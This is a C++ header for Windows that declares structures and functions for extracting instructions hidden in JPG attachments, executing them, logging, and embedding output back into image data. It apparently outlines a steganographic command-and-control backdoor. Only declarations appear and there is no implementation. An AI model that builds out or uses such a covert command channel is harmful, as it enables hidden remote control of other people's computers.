#ifndef __STEGO_H__
#define __STEGO_H__

#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <vector>
#include <intrin.h>
#include <stdexcept>
#include <memory>
#include "base64.h"
#include "cryptopp\osrng.h"
#include "cryptopp\aes.h"
#include "cryptopp\filters.h"
#include "cryptopp\modes.h"
#include "cryptopp\hex.h"
#include "cryptopp\cryptlib.h"


/// <summary>
/// Used to store command data extracted from image
/// </summary>
struct command {
    int InstId; //Unique ID to identify this command
    int InstrCode; //The instruction that will be executed
    int fpl; //First parameter length
    std::string fp; //First parameter
    int spl; //Second parameter length
    std::string sp; //Second parameter
    int bpl; //Third parameter length
    std::string bp; //Third parameter
};

/// <summary>
/// Used to hold the container extracted from the image
/// </summary>
struct container {
    int CmdID;
    int rcptl; //Recipient address length
    std::string rcpt; //Recipient address
    command commands;
};



bool checkSignature(std::vector<unsigned char> &input);
void intToBytes(unsigned int n, unsigned char bytes[]);
bool embed(std::vector<unsigned char> &data, int offset, std::string outputData);
std::string executeContainer(container container, std::string log_file);
std::string extract(std::vector<unsigned char> &data, int offset, std::string log_file);
std::string getArgument(std::vector<unsigned char> &data, int offset, int length);
int getSectionLength(std::vector<unsigned char> &data, int length, int offset);
std::vector<unsigned char> substring(std::vector<unsigned char> &data, int offset, int length);
bool analyzeJPG(char* &attachment, std::string sig, std::string log_file);


#endif